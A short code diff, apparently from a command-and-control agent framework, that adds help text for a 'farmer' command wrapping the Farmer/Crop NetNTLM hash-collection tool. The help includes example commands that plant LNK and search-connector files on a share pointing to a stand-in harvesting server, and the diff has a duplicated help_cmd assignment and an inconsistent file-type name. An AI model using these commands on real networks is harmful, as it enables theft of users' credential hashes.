@@ -33,7 +33,21 @@ class FarmerCommand(CommandBase):
     cmd = "farmer"
     needs_admin = False
     help_cmd = "farmer"
-    description = "Copy a file from one location to another."
+    description = "Farmer is a project for collecting NetNTLM hashes in a Windows domain."
+    help_cmd = """
+Crop https://github.com/mdsecactivebreach/Farmer
+    created by @domchell
+
+Crop is a tool that can create LNK files that initiate a WebDAV connection when browsing to a folder where it's stored.
+
+Supported LNK types: .lnk, .url, .library-ms, .searchconnect-ms
+
+Drop an LNK file
+crop -targetLocation \\myserver\shared\ -targetFilename Athena.lnk -targetPath \\MyCropServer:8080\harvest -targetIcon \\MyCropServer:8080\harvest\my.ico
+
+Drop a .searchconnect-ms
+crop -targetLocation \\myserver\shared\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\harvest -recurse      
+    """
     version = 1
     is_exit = False
     is_file_browse = False
@@ -41,6 +55,7 @@ class FarmerCommand(CommandBase):
     is_download_file = False
     is_remove_file = False
     is_upload_file = False
+    
     author = "@domchell, @checkymander"
     argument_class = FarmerArguments
     attackmapping = []
